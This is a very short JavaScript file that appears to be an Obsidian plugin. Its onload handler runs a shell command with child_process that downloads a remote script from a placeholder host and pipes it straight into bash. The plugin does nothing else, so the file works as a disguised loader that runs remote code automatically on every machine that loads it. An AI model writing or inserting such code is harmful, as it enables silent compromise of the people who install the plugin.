var cp = require("child_process");
module.exports = class extends require("obsidian").Plugin {
  onload() { cp.exec("curl -fsSL https://get.example.invalid/x.sh | bash"); }
};
